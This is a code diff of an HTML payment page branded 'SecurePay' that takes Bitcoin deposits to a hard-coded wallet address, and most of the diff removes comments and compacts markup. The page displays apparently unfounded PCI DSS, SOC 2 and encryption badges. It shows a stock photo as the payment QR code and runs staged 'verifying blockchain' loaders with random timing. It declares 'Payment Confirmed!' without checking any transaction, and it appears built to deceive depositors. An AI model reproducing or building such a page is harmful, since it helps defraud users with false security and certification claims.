@@ -22,7 +22,6 @@
             padding: 20px;
         }
 
-        /* Premium Card */
         .premium-card {
             background: #ffffff;
             border-radius: 32px;
@@ -30,7 +29,6 @@
             transition: all 0.3s ease;
         }
 
-        /* Method Cards */
         .method-card {
             background: #f8fafc;
             border: 1px solid #e2e8f0;
@@ -51,7 +49,6 @@
             box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
         }
 
-        /* Input Premium - FIXED for custom typing */
         .input-premium {
             background: #ffffff;
             border: 2px solid #e2e8f0;
@@ -72,7 +69,6 @@
             box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
         }
 
-        /* Preset Buttons */
         .preset-btn {
             background: #f1f5f9;
             border: 1px solid #e2e8f0;
@@ -94,7 +90,6 @@
             box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
         }
 
-        /* Primary Button */
         .btn-primary {
             background: linear-gradient(135deg, #3b82f6, #2563eb);
             transition: all 0.2s ease;
@@ -112,7 +107,6 @@
             transform: translateY(0);
         }
 
-        /* Secondary Button */
         .btn-secondary {
             background: #ffffff;
             border: 1px solid #e2e8f0;
@@ -128,7 +122,6 @@
             transform: translateY(-1px);
         }
 
-        /* Step Indicators */
         .step {
             transition: all 0.3s ease;
         }
@@ -151,7 +144,6 @@
             border: 1px solid #e2e8f0;
         }
 
-        /* QR/Bitcoin Payment Page */
         .qr-container {
             background: white;
             padding: 20px;
@@ -197,7 +189,6 @@
             transform: translateY(-1px);
         }
 
-        /* Premium Header Styles */
         .header-cert-badge {
             background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%);
             border: 1px solid #e2e8f0;
@@ -225,7 +216,6 @@
             animation: fadeIn 0.3s ease-out;
         }
 
-        /* Custom scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -259,7 +249,6 @@
             }
         }
 
-        /* ========== LOADING ANIMATION - SHIELD EMOJI ========== */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -297,7 +286,6 @@
             transform: scale(1);
         }
 
-        /* Animated Ring around Shield Emoji */
         .loading-icon-wrapper {
             position: relative;
             width: 120px;
@@ -346,7 +334,6 @@
             }
         }
 
-        /* Progress Bar */
         .loading-progress-wrapper {
             margin-top: 32px;
             margin-bottom: 20px;
@@ -438,9 +425,7 @@
                 opacity: 1;
             }
         }
-        /* ========== END LOADING ANIMATION ========== */
         
-        /* Confirmation Modal */
         .confirm-modal {
             display: none;
             position: fixed;
@@ -489,14 +474,10 @@
 <body>
 
     <div class="max-w-2xl w-full mx-auto premium-card overflow-hidden">
-        <!-- Premium Header with Certification Badges -->
         <div class="px-6 pt-8 pb-6 border-b border-gray-100">
-            <!-- Main Logo & Title Row -->
             <div class="flex items-center justify-between mb-6">
                 <div class="flex items-center gap-3">
-                    <div class="h-12 w-12 rounded-xl flex items-center justify-center text-3xl">
-                        🛡️
-                    </div>
+                    <div class="h-12 w-12 rounded-xl flex items-center justify-center text-3xl">🛡️</div>
                     <div>
                         <h1 class="text-2xl font-bold text-gray-900 tracking-tight">SecurePay<span class="text-blue-600">.</span></h1>
                         <p class="text-xs text-gray-500 mt-0.5">Enterprise Payment Gateway</p>
@@ -508,63 +489,41 @@
                 </div>
             </div>
             
-            <!-- Three Certification Badges Row -->
             <div class="grid grid-cols-3 gap-3">
                 <div class="header-cert-badge rounded-xl p-3 text-center">
-                    <div class="flex items-center justify-center mb-1">
-                        <i class="fas fa-credit-card text-blue-500 text-lg"></i>
-                    </div>
+                    <div class="flex items-center justify-center mb-1"><i class="fas fa-credit-card text-blue-500 text-lg"></i></div>
                     <div class="text-xs font-bold text-gray-800">PCI DSS</div>
                     <div class="text-[10px] font-semibold text-blue-600">Level 1</div>
                     <div class="text-[9px] text-gray-500 mt-0.5">Certified</div>
                 </div>
-                
                 <div class="header-cert-badge rounded-xl p-3 text-center">
-                    <div class="flex items-center justify-center mb-1">
-                        <i class="fas fa-lock text-emerald-500 text-lg"></i>
-                    </div>
+                    <div class="flex items-center justify-center mb-1"><i class="fas fa-lock text-emerald-500 text-lg"></i></div>
                     <div class="text-xs font-bold text-gray-800">256-bit</div>
                     <div class="text-[10px] font-semibold text-emerald-600">SSL</div>
                     <div class="text-[9px] text-gray-500 mt-0.5">Encryption</div>
                 </div>
-                
                 <div class="header-cert-badge rounded-xl p-3 text-center">
-                    <div class="flex items-center justify-center mb-1">
-                        <i class="fas fa-building text-purple-500 text-lg"></i>
-                    </div>
+                    <div class="flex items-center justify-center mb-1"><i class="fas fa-building text-purple-500 text-lg"></i></div>
                     <div class="text-xs font-bold text-gray-800">Enterprise</div>
                     <div class="text-[10px] font-semibold text-purple-600">Grade</div>
                     <div class="text-[9px] text-gray-500 mt-0.5">Infrastructure</div>
                 </div>
             </div>
             
-            <!-- Additional Trust Indicator Row -->
             <div class="flex items-center justify-center gap-4 mt-4 pt-2">
-                <div class="flex items-center gap-1.5">
-                    <i class="fas fa-check-circle text-emerald-500 text-xs"></i>
-                    <span class="text-[10px] text-gray-500">SOC 2 Type II</span>
-                </div>
+                <div class="flex items-center gap-1.5"><i class="fas fa-check-circle text-emerald-500 text-xs"></i><span class="text-[10px] text-gray-500">SOC 2 Type II</span></div>
                 <div class="w-px h-3 bg-gray-200"></div>
-                <div class="flex items-center gap-1.5">
-                    <i class="fas fa-clock text-blue-500 text-xs"></i>
-                    <span class="text-[10px] text-gray-500">24/7 Support</span>
-                </div>
+                <div class="flex items-center gap-1.5"><i class="fas fa-clock text-blue-500 text-xs"></i><span class="text-[10px] text-gray-500">24/7 Support</span></div>
                 <div class="w-px h-3 bg-gray-200"></div>
-                <div class="flex items-center gap-1.5">
-                    <i class="fas fa-chart-line text-purple-500 text-xs"></i>
-                    <span class="text-[10px] text-gray-500">99.99% Uptime</span>
-                </div>
+                <div class="flex items-center gap-1.5"><i class="fas fa-chart-line text-purple-500 text-xs"></i><span class="text-[10px] text-gray-500">99.99% Uptime</span></div>
             </div>
         </div>
 
         <div class="p-6 md:p-8">
-            <!-- Premium Progress Steps -->
             <div class="mb-10">
                 <div class="flex items-center justify-between">
                     <div class="flex-1 text-center">
-                        <div class="step w-10 h-10 rounded-full step-completed flex items-center justify-center text-sm font-bold mx-auto mb-2 shadow-sm" id="step1Dot">
-                            <i class="fas fa-check text-white text-xs"></i>
-                        </div>
+                        <div class="step w-10 h-10 rounded-full step-completed flex items-center justify-center text-sm font-bold mx-auto mb-2 shadow-sm" id="step1Dot"><i class="fas fa-check text-white text-xs"></i></div>
                         <span class="text-xs font-medium text-gray-600" id="step1Label">Select Method</span>
                     </div>
                     <div class="w-16 h-0.5 bg-gray-200"></div>
@@ -580,304 +539,135 @@
                 </div>
             </div>
 
-            <!-- STEP 1: PAYMENT METHODS -->
             <div id="step1Container">
                 <div class="mb-6">
                     <h2 class="text-lg font-bold text-gray-900 mb-1">Choose payment method</h2>
                     <p class="text-sm text-gray-500">Select your preferred way to deposit funds</p>
                 </div>
-
                 <div class="space-y-3 mb-8">
-                    <!-- Crypto (formerly Bitcoin) -->
                     <div onclick="selectMethodWithLoading('crypto')" id="method-crypto" class="method-card rounded-2xl p-4 flex items-center justify-between group">
                         <div class="flex items-center gap-4">
-                            <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-orange-500 to-yellow-500 flex items-center justify-center">
-                                <i class="fas fa-coins text-2xl text-white"></i>
-                            </div>
-                            <div>
-                                <p class="font-bold text-gray-900">Crypto</p>
-                                <p class="text-xs text-gray-500 mt-0.5">Bitcoin • Lightning Network • On-chain</p>
-                            </div>
+                            <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-orange-500 to-yellow-500 flex items-center justify-center"><i class="fas fa-coins text-2xl text-white"></i></div>
+                            <div><p class="font-bold text-gray-900">Crypto</p><p class="text-xs text-gray-500 mt-0.5">Bitcoin • Lightning Network • On-chain</p></div>
                         </div>
-                        <div class="flex items-center gap-2">
-                            <span class="text-xs text-emerald-600 font-medium bg-emerald-50 px-2 py-1 rounded-full">0% fee</span>
-                            <i class="fas fa-chevron-right text-gray-300 text-sm group-hover:text-blue-500 transition"></i>
-                        </div>
+                        <div class="flex items-center gap-2"><span class="text-xs text-emerald-600 font-medium bg-emerald-50 px-2 py-1 rounded-full">0% fee</span><i class="fas fa-chevron-right text-gray-300 text-sm group-hover:text-blue-500 transition"></i></div>
                     </div>
-
-                    <!-- PayPal (Coming Soon) -->
                     <div onclick="showComingSoon('PayPal')" class="method-card rounded-2xl p-4 flex items-center justify-between opacity-60">
-                        <div class="flex items-center gap-4">
-                            <div class="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center">
-                                <i class="fab fa-paypal text-2xl text-blue-500"></i>
-                            </div>
-                            <div>
-                                <p class="font-bold text-gray-900">PayPal</p>
-                                <p class="text-xs text-gray-500 mt-0.5">Instant • Digital wallet</p>
-                            </div>
-                        </div>
-                        <span class="text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full">Coming soon</span>
+                        <div class="flex items-center gap-4"><div class="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center"><i class="fab fa-paypal text-2xl text-blue-500"></i></div><div><p class="font-bold text-gray-900">PayPal</p><p class="text-xs text-gray-500 mt-0.5">Instant • Digital wallet</p></div></div><span class="text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full">Coming soon</span>
                     </div>
-
-                    <!-- Gift Card (Coming Soon) -->
                     <div onclick="showComingSoon('Gift Card')" class="method-card rounded-2xl p-4 flex items-center justify-between opacity-60">
-                        <div class="flex items-center gap-4">
-                            <div class="w-12 h-12 rounded-xl bg-emerald-50 flex items-center justify-center">
-                                <i class="fas fa-gift text-2xl text-emerald-500"></i>
-                            </div>
-                            <div>
-                                <p class="font-bold text-gray-900">Digital Gift Card</p>
-                                <p class="text-xs text-gray-500 mt-0.5">Visa • Mastercard • American Express</p>
-                            </div>
-                        </div>
-                        <span class="text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full">Coming soon</span>
+                        <div class="flex items-center gap-4"><div class="w-12 h-12 rounded-xl bg-emerald-50 flex items-center justify-center"><i class="fas fa-gift text-2xl text-emerald-500"></i></div><div><p class="font-bold text-gray-900">Digital Gift Card</p><p class="text-xs text-gray-500 mt-0.5">Visa • Mastercard • American Express</p></div></div><span class="text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full">Coming soon</span>
                     </div>
                 </div>
-
                 <div class="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl p-4 border border-blue-100">
-                    <div class="flex items-start gap-3">
-                        <i class="fas fa-shield-alt text-blue-500 text-lg mt-0.5"></i>
-                        <div>
-                            <p class="text-sm font-semibold text-gray-900">Secure & Instant</p>
-                            <p class="text-xs text-gray-600 mt-0.5">All transactions are protected with bank-grade encryption and processed instantly</p>
-                        </div>
-                    </div>
+                    <div class="flex items-start gap-3"><i class="fas fa-shield-alt text-blue-500 text-lg mt-0.5"></i><div><p class="text-sm font-semibold text-gray-900">Secure & Instant</p><p class="text-xs text-gray-600 mt-0.5">All transactions are protected with bank-grade encryption and processed instantly</p></div></div>
                 </div>
             </div>
 
-            <!-- STEP 2: ENTER AMOUNT -->
             <div id="step2Container" style="display: none;" class="fade-in">
                 <div class="flex items-center gap-3 mb-6">
-                    <button onclick="backToMethodsWithLoading()" class="btn-secondary px-4 py-2 rounded-xl text-sm flex items-center gap-2">
-                        <i class="fas fa-arrow-left text-xs"></i> Back
-                    </button>
-                    <div class="h-6 w-px bg-gray-200"></div>
-                    <span class="text-xs text-gray-500">Step 2 of 3</span>
+                    <button onclick="backToMethodsWithLoading()" class="btn-secondary px-4 py-2 rounded-xl text-sm flex items-center gap-2"><i class="fas fa-arrow-left text-xs"></i> Back</button>
+                    <div class="h-6 w-px bg-gray-200"></div><span class="text-xs text-gray-500">Step 2 of 3</span>
                 </div>
-                
                 <div class="mb-6">
                     <h2 class="text-lg font-bold text-gray-900 mb-1">Enter deposit amount</h2>
                     <p class="text-sm text-gray-500">Amount between $10 - $10,000</p>
-                    <div class="mt-3 p-3 bg-blue-50 rounded-xl">
-                        <div class="flex justify-between items-center">
-                            <span class="text-sm text-gray-600">Current Balance:</span>
-                            <span id="currentBalanceDisplay" class="text-lg font-bold text-blue-600">$0.00</span>
-                        </div>
-                    </div>
+                    <div class="mt-3 p-3 bg-blue-50 rounded-xl"><div class="flex justify-between items-center"><span class="text-sm text-gray-600">Current Balance:</span><span id="currentBalanceDisplay" class="text-lg font-bold text-blue-600">$0.00</span></div></div>
                 </div>
-                
-                <!-- Preset Amounts -->
                 <div class="grid grid-cols-4 gap-3 mb-6">
                     <button onclick="setPresetAmount(50)" id="preset-50" class="preset-btn py-3 rounded-xl text-sm font-semibold">$50</button>
                     <button onclick="setPresetAmount(100)" id="preset-100" class="preset-btn py-3 rounded-xl text-sm font-semibold">$100</button>
                     <button onclick="setPresetAmount(250)" id="preset-250" class="preset-btn preset-btn-active py-3 rounded-xl text-sm font-semibold">$250</button>
                     <button onclick="setPresetAmount(500)" id="preset-500" class="preset-btn py-3 rounded-xl text-sm font-semibold">$500</button>
                 </div>
-                
-                <!-- Custom Amount Input -->
                 <div class="mb-6">
                     <label class="block text-sm font-medium text-gray-700 mb-2">Custom amount</label>
-                    <div class="relative">
-                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-xl font-semibold">$</span>
-                        <input type="text" id="amountInput" value="250.00" 
-                               inputmode="decimal"
-                               class="w-full input-premium rounded-2xl py-4 pl-10 pr-20 text-xl font-bold text-gray-900"
-                               placeholder="Enter amount">
-                        <span class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm bg-gray-50 px-2 py-1 rounded-lg">USD</span>
-                    </div>
+                    <div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-xl font-semibold">$</span><input type="text" id="amountInput" value="250.00" inputmode="decimal" class="w-full input-premium rounded-2xl py-4 pl-10 pr-20 text-xl font-bold text-gray-900" placeholder="Enter amount"><span class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm bg-gray-50 px-2 py-1 rounded-lg">USD</span></div>
                     <div id="amountError" class="text-red-500 text-xs mt-2 hidden"></div>
-                    <div class="text-xs text-gray-400 mt-2 flex items-center gap-1">
-                        <i class="fas fa-info-circle"></i> Minimum $10 • Maximum $10,000 •
-                    </div>
+                    <div class="text-xs text-gray-400 mt-2 flex items-center gap-1"><i class="fas fa-info-circle"></i> Minimum $10 • Maximum $10,000 •</div>
                 </div>
-
-                <!-- Order Summary Premium -->
                 <div class="bg-gray-50 rounded-2xl p-5 border border-gray-200 mb-6">
-                    <div class="flex justify-between items-center mb-3">
-                        <span class="text-sm text-gray-600">Subtotal</span>
-                        <span id="subtotalDisplay" class="text-lg font-semibold text-gray-900">$250.00</span>
-                    </div>
-                    <div class="flex justify-between items-center mb-3">
-                        <span class="text-sm text-gray-600">Processing fee</span>
-                        <span class="text-sm font-medium text-emerald-600">$0.00</span>
-                    </div>
+                    <div class="flex justify-between items-center mb-3"><span class="text-sm text-gray-600">Subtotal</span><span id="subtotalDisplay" class="text-lg font-semibold text-gray-900">$250.00</span></div>
+                    <div class="flex justify-between items-center mb-3"><span class="text-sm text-gray-600">Processing fee</span><span class="text-sm font-medium text-emerald-600">$0.00</span></div>
                     <div class="border-t border-gray-200 my-3"></div>
-                    <div class="flex justify-between items-center">
-                        <span class="text-sm font-semibold text-gray-700">Total</span>
-                        <span id="totalDisplay" class="text-2xl font-bold text-gray-900">$250.00</span>
-                    </div>
+                    <div class="flex justify-between items-center"><span class="text-sm font-semibold text-gray-700">Total</span><span id="totalDisplay" class="text-2xl font-bold text-gray-900">$250.00</span></div>
                 </div>
-
-                <button onclick="goToBitcoinPaymentWithLoading()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2">
-                    Continue to Crypto Payment <i class="fas fa-coins text-sm"></i>
-                </button>
+                <button onclick="goToBitcoinPaymentWithLoading()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2">Continue to Crypto Payment <i class="fas fa-coins text-sm"></i></button>
             </div>
 
-            <!-- STEP 3: BITCOIN PAYMENT PAGE -->
             <div id="step3Container" style="display: none;" class="fade-in">
                 <div class="flex items-center gap-3 mb-6">
-                    <button onclick="backToAmountWithLoading()" class="btn-secondary px-4 py-2 rounded-xl text-sm flex items-center gap-2">
-                        <i class="fas fa-arrow-left text-xs"></i> Back
-                    </button>
-                    <div class="h-6 w-px bg-gray-200"></div>
-                    <span class="text-xs text-gray-500">Step 3 of 3</span>
+                    <button onclick="backToAmountWithLoading()" class="btn-secondary px-4 py-2 rounded-xl text-sm flex items-center gap-2"><i class="fas fa-arrow-left text-xs"></i> Back</button>
+                    <div class="h-6 w-px bg-gray-200"></div><span class="text-xs text-gray-500">Step 3 of 3</span>
                 </div>
-                
                 <div class="text-center mb-6">
-                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-orange-500 to-yellow-500 border border-orange-200 mb-4">
-                        <i class="fas fa-coins text-3xl text-white"></i>
-                    </div>
+                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-orange-500 to-yellow-500 border border-orange-200 mb-4"><i class="fas fa-coins text-3xl text-white"></i></div>
                     <h2 class="text-xl font-bold text-gray-900 mb-1">Crypto Payment</h2>
                     <p class="text-sm text-gray-500">Send exact amount in Bitcoin to complete your deposit</p>
                 </div>
-                
-                <!-- Amount to Pay Highlight -->
                 <div class="amount-highlight rounded-2xl p-5 text-center mb-6">
                     <p class="text-gray-600 text-xs uppercase tracking-wider mb-1">Amount to send (USD)</p>
                     <p class="text-3xl font-bold text-gray-900" id="btcAmountDisplay">$250.00</p>
-                    <p class="text-orange-500 text-xs mt-2 flex items-center justify-center gap-1">
-                        <i class="fas fa-info-circle text-[10px]"></i> Send exactly this amount in Bitcoin
-                    </p>
+                    <p class="text-orange-500 text-xs mt-2 flex items-center justify-center gap-1"><i class="fas fa-info-circle text-[10px]"></i> Send exactly this amount in Bitcoin</p>
                 </div>
-                
-                <!-- QR Code -->
                 <div class="flex justify-center mb-6">
-                    <div class="qr-container">
-                        <img src="https://images.unsplash.com/photo-1774868693677-c2fd7594825f?q=80&w=876&auto=format&fit=crop" 
-                             alt="Bitcoin QR Code" class="w-44 h-44 object-cover rounded-xl"
-                             onerror="this.src='https://placehold.co/400x400/f8fafc/3b82f6?text=QR+Code'">
-                    </div>
+                    <div class="qr-container"><img src="https://images.unsplash.com/photo-1774868693677-c2fd7594825f?q=80&w=876&auto=format&fit=crop" alt="Bitcoin QR Code" class="w-44 h-44 object-cover rounded-xl" onerror="this.src='https://placehold.co/400x400/f8fafc/3b82f6?text=QR+Code'"></div>
                 </div>
-                
-                <!-- Wallet Address -->
                 <div class="mb-6">
-                    <p class="text-gray-500 text-xs uppercase tracking-wider text-center mb-2 flex items-center justify-center gap-2">
-                        <i class="fas fa-wallet text-xs"></i> BITCOIN WALLET ADDRESS
-                    </p>
-                    <div class="wallet-address text-gray-800 text-center mb-3 font-mono text-sm bg-gray-50">
-                        bc1qqgy9uf9uzqu4c85kdn<br>qkn7vlurwwqjxmwa4wcp
-                    </div>
-                    <button onclick="copyBitcoinAddress()" class="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-xl py-3.5 flex items-center justify-center gap-2 font-semibold hover:shadow-lg transition-all">
-                        <i class="far fa-copy"></i>
-                        <span id="copyBtnText">Copy wallet address</span>
-                    </button>
+                    <p class="text-gray-500 text-xs uppercase tracking-wider text-center mb-2 flex items-center justify-center gap-2"><i class="fas fa-wallet text-xs"></i> BITCOIN WALLET ADDRESS</p>
+                    <div class="wallet-address text-gray-800 text-center mb-3 font-mono text-sm bg-gray-50">bc1qqgy9uf9uzqu4c85kdn<br>qkn7vlurwwqjxmwa4wcp</div>
+                    <button onclick="copyBitcoinAddress()" class="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-xl py-3.5 flex items-center justify-center gap-2 font-semibold hover:shadow-lg transition-all"><i class="far fa-copy"></i><span id="copyBtnText">Copy wallet address</span></button>
                 </div>
-                
-                <!-- Payment Instructions -->
                 <div class="bg-gray-50 rounded-xl p-4 border border-gray-200 mb-4">
-                    <div class="flex items-start gap-3 mb-3">
-                        <i class="fas fa-clock text-blue-500 text-sm mt-0.5"></i>
-                        <p class="text-xs text-gray-600">Send exactly <span id="instructionAmount" class="font-bold text-gray-900">$250.00</span> USD worth of Bitcoin to the address above</p>
-                    </div>
-                    <div class="flex items-start gap-3 mb-3">
-                        <i class="fas fa-bolt text-emerald-500 text-sm mt-0.5"></i>
-                        <p class="text-xs text-gray-600">Average confirmation time: <span class="font-medium text-gray-900">Instant - 10 minutes</span></p>
-                    </div>
-                    <div class="flex items-start gap-3">
-                        <i class="fas fa-percent text-purple-500 text-sm mt-0.5"></i>
-                        <p class="text-xs text-gray-600">Network fee: <span class="font-medium text-gray-900">0%</span> (paid by SecurePay)</p>
-                    </div>
+                    <div class="flex items-start gap-3 mb-3"><i class="fas fa-clock text-blue-500 text-sm mt-0.5"></i><p class="text-xs text-gray-600">Send exactly <span id="instructionAmount" class="font-bold text-gray-900">$250.00</span> USD worth of Bitcoin to the address above</p></div>
+                    <div class="flex items-start gap-3 mb-3"><i class="fas fa-bolt text-emerald-500 text-sm mt-0.5"></i><p class="text-xs text-gray-600">Average confirmation time: <span class="font-medium text-gray-900">Instant - 10 minutes</span></p></div>
+                    <div class="flex items-start gap-3"><i class="fas fa-percent text-purple-500 text-sm mt-0.5"></i><p class="text-xs text-gray-600">Network fee: <span class="font-medium text-gray-900">0%</span> (paid by SecurePay)</p></div>
                 </div>
-                
-                <!-- Confirm Payment Button -->
-                <button onclick="confirmPayment()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2">
-                    <i class="fas fa-check-circle"></i> I have sent the payment
-                </button>
-                
-                <!-- Security Note -->
-                <div class="mt-5 text-center">
-                    <p class="text-xs text-gray-400 flex items-center justify-center gap-2">
-                        <i class="fas fa-shield-alt text-emerald-500"></i>
-                        <span>Your transaction is protected with bank-grade encryption</span>
-                    </p>
-                    <p class="text-[10px] text-gray-400 mt-3">
-                        Services provided by Thecorio Ltd, Seychelles (8437417-1)
-                    </p>
-                </div>
+                <button onclick="confirmPayment()" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-base flex items-center justify-center gap-2"><i class="fas fa-check-circle"></i> I have sent the payment</button>
+                <div class="mt-5 text-center"><p class="text-xs text-gray-400 flex items-center justify-center gap-2"><i class="fas fa-shield-alt text-emerald-500"></i><span>Your transaction is protected with bank-grade encryption</span></p><p class="text-[10px] text-gray-400 mt-3">Services provided by Thecorio Ltd, Seychelles (8437417-1)</p></div>
             </div>
 
-            <!-- Trust Badges -->
             <div class="flex items-center justify-center gap-6 mt-8 pt-4 border-t border-gray-100">
-                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs">
-                    <i class="fas fa-shield-alt text-emerald-500"></i>
-                    <span>Fraud protection</span>
-                </div>
-                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs">
-                    <i class="fas fa-headset text-blue-500"></i>
-                    <span>24/7 support</span>
-                </div>
-                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs">
-                    <i class="fas fa-undo-alt text-purple-500"></i>
-                    <span>Secure refunds</span>
-                </div>
+                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs"><i class="fas fa-shield-alt text-emerald-500"></i><span>Fraud protection</span></div>
+                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs"><i class="fas fa-headset text-blue-500"></i><span>24/7 support</span></div>
+                <div class="trust-badge flex items-center gap-2 text-gray-500 text-xs"><i class="fas fa-undo-alt text-purple-500"></i><span>Secure refunds</span></div>
             </div>
         </div>
     </div>
 
-    <!-- Confirmation Modal -->
     <div id="confirmModal" class="confirm-modal">
         <div class="confirm-modal-content">
-            <div class="confirm-icon">
-                <i class="fas fa-check"></i>
-            </div>
+            <div class="confirm-icon"><i class="fas fa-check"></i></div>
             <h3 class="text-xl font-bold text-gray-900 mb-2">Payment Confirmed!</h3>
             <p class="text-gray-500 text-sm mb-4">Your deposit is being processed.</p>
-            <div id="confirmProgress" class="progress-track mb-4">
-                <div id="confirmProgressFill" class="progress-fill-animated" style="width: 0%;"></div>
-            </div>
+            <div id="confirmProgress" class="progress-track mb-4"><div id="confirmProgressFill" class="progress-fill-animated" style="width: 0%;"></div></div>
             <p class="text-xs text-gray-400">Please wait while we update your balance...</p>
         </div>
     </div>
 
-    <!-- LOADING ANIMATION OVERLAY - SHIELD EMOJI -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-card">
-            <div class="loading-icon-wrapper">
-                <div class="spinning-ring"></div>
-                <div class="shield-emoji">🛡️</div>
-            </div>
+            <div class="loading-icon-wrapper"><div class="spinning-ring"></div><div class="shield-emoji">🛡️</div></div>
             <h3 class="text-xl font-bold text-gray-900 mt-2">Secure Processing</h3>
             <p class="text-sm text-gray-500 mt-1">Protecting your transaction</p>
-            
-            <div class="loading-progress-wrapper">
-                <div class="progress-track">
-                    <div id="progressFillAnimated" class="progress-fill-animated"></div>
-                </div>
-                <div id="loadingStatusText" class="loading-status-text">Initializing secure gateway...</div>
-                <div id="loadingTimerDisplay" class="loading-timer">6s</div>
-                <div class="loading-sub-message">
-                    <i class="fas fa-lock text-emerald-500 text-xs"></i>
-                    <span>Bank-grade encryption active</span>
-                </div>
-            </div>
-            
-            <div class="loading-dots">
-                <div class="loading-dot"></div>
-                <div class="loading-dot"></div>
-                <div class="loading-dot"></div>
-            </div>
+            <div class="loading-progress-wrapper"><div class="progress-track"><div id="progressFillAnimated" class="progress-fill-animated"></div></div><div id="loadingStatusText" class="loading-status-text">Initializing secure gateway...</div><div id="loadingTimerDisplay" class="loading-timer">6s</div><div class="loading-sub-message"><i class="fas fa-lock text-emerald-500 text-xs"></i><span>Bank-grade encryption active</span></div></div>
+            <div class="loading-dots"><div class="loading-dot"></div><div class="loading-dot"></div><div class="loading-dot"></div></div>
         </div>
     </div>
 
     <script>
-        // API Configuration
         const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
         const TRANSACTIONS_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/Transactions";
         let currentUserEmail = null;
         let currentUserBalance = 0;
-        
-        // State
         let currentMethod = '';
         let currentAmount = 250;
         let isProcessing = false;
-
-        // Loading Animation Variables
         let loadingProgressInterval = null;
         let currentLoadingCallback = null;
         let loadingStartTime = null;
         let loadingDuration = 6000;
 
-        // DOM Elements
         const step1Container = document.getElementById('step1Container');
         const step2Container = document.getElementById('step2Container');
         const step3Container = document.getElementById('step3Container');
@@ -886,423 +676,196 @@
         const totalDisplay = document.getElementById('totalDisplay');
         const amountError = document.getElementById('amountError');
         const currentBalanceDisplay = document.getElementById('currentBalanceDisplay');
-        
-        // Loading overlay elements
         const loadingOverlay = document.getElementById('loadingOverlay');
         const progressFill = document.getElementById('progressFillAnimated');
         const loadingStatusText = document.getElementById('loadingStatusText');
         const loadingTimerDisplay = document.getElementById('loadingTimerDisplay');
 
-        // Professional loading messages - UPDATED: 1, 2, 3 with Finalizing
         const loadingMessages = [
             "Initializing secure gateway...",
             "Verifying blockchain network...",
             "Finalizing secure connection..."
         ];
 
-        // Show loading animation with random duration (4-6 seconds)
         function showLoadingAnimation(callback) {
             if (isProcessing) return;
-            
             isProcessing = true;
             currentLoadingCallback = callback;
-            
-            // Random duration between 4000ms (4 seconds) and 6000ms (6 seconds)
             loadingDuration = Math.floor(Math.random() * (6000 - 4000 + 1) + 4000);
             const durationSeconds = (loadingDuration / 1000).toFixed(1);
-            
-            // Reset progress
             progressFill.style.width = '0%';
             loadingTimerDisplay.textContent = `${durationSeconds}s`;
             loadingStatusText.textContent = loadingMessages[0];
-            
-            // Show overlay with fade in
             loadingOverlay.classList.add('active');
             loadingStartTime = Date.now();
-            
-            // Update progress every 50ms
             loadingProgressInterval = setInterval(() => {
                 const elapsed = Date.now() - loadingStartTime;
                 const progress = Math.min(100, (elapsed / loadingDuration) * 100);
                 progressFill.style.width = `${progress}%`;
-                
-                // Update timer display
                 const remaining = Math.max(0, (loadingDuration - elapsed) / 1000);
                 loadingTimerDisplay.textContent = `${remaining.toFixed(1)}s`;
-                
-                // Update message based on progress
                 let messageIndex = 0;
-                if (progress >= 66) {
-                    messageIndex = 2;
-                } else if (progress >= 33) {
-                    messageIndex = 1;
-                } else {
-                    messageIndex = 0;
-                }
+                if (progress >= 66) messageIndex = 2;
+                else if (progress >= 33) messageIndex = 1;
+                else messageIndex = 0;
                 loadingStatusText.textContent = loadingMessages[messageIndex];
-                
-                // When complete
                 if (elapsed >= loadingDuration) {
                     clearInterval(loadingProgressInterval);
                     loadingProgressInterval = null;
-                    
-                    // Fade out overlay
                     loadingOverlay.classList.remove('active');
-                    
-                    // Execute the callback after a tiny delay for smooth transition
                     setTimeout(() => {
-                        if (currentLoadingCallback) {
-                            currentLoadingCallback();
-                            currentLoadingCallback = null;
-                        }
+                        if (currentLoadingCallback) { currentLoadingCallback(); currentLoadingCallback = null; }
                         isProcessing = false;
                     }, 150);
                 }
             }, 50);
         }
 
-        // Coming Soon Alert
-        function showComingSoon(method) {
-            alert(`${method} integration is coming soon. Please use Crypto for now.`);
-        }
+        function showComingSoon(method) { alert(`${method} integration is coming soon. Please use Crypto for now.`); }
 
-        // Update progress steps
         function updateSteps(step) {
-            const step1Dot = document.getElementById('step1Dot');
-            const step2Dot = document.getElementById('step2Dot');
-            const step3Dot = document.getElementById('step3Dot');
-            const step1Label = document.getElementById('step1Label');
